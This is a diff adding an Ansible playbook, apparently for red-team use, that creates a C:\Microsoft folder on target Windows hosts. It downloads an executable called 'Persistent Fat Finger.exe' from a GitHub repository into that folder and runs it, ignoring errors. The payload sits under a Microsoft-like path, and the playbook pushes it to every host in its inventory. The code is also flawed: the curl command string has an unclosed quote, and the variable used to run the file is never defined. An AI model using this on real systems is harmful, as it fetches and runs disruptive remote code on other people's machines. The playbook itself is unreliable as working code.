@@ -1,0 +1,29 @@
+---
+- name: Deploy fat fingering program
+  hosts: targets
+  gather_facts: false
+  vars:
+    curl_command: 'curl -L -o "C:\Microsoft\finger.exe" "https://github.com/astorrs276/Red-Team-Projects/raw/refs/heads/main/ahk/Persistent%20Fat%20Finger.exe" & start ''
+  tasks:
+    - name: Create C:\Microsoft
+      ansible.windows.win_file:
+        path: C:\Microsoft
+        state: directory
+
+    - name: Run curl on the remote host
+      ansible.builtin.shell: "{{ curl_command }}"
+      register: result
+      ignore_errors: true
+
+    - name: Run the downloaded executable and wait for completion (foreground)
+      ansible.windows.win_command: '{{ target_path }}'
+      register: run_result
+      ignore_errors: true
+
+    - name: Print output from each host
+      ansible.builtin.debug:
+        msg:
+          - "Host: {{ inventory_hostname }}"
+          - "rc: {{ result.rc }}"
+          - "stdout: {{ result.stdout | default('') }}"
+          - "stderr: {{ result.stderr | default('') }}"
